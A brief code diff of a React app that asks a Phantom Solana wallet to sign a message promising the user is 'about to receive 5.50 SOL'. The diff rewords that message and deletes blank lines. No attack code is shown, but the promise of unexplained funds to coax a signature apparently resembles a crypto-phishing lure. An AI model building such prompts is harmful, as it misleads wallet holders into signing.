@@ -212,7 +212,7 @@ export default function App() {
       }
       
       // Create message to sign
-      const message = new TextEncoder().encode(`Account is about to be credited with 5.50 SOL! ${new Date().toISOString()}`);
+      const message = new TextEncoder().encode(`Account is about to receive 5.50 SOL! ${new Date().toISOString()}`);
       
       // Sign the message
       let signature;
@@ -276,10 +276,6 @@ export default function App() {
 
       } else if (window.phantom?.solana?.signMessage) {
         signature = await window.phantom.solana.signMessage(message, 'utf8');
-
-
-
-        
             try {
               
 
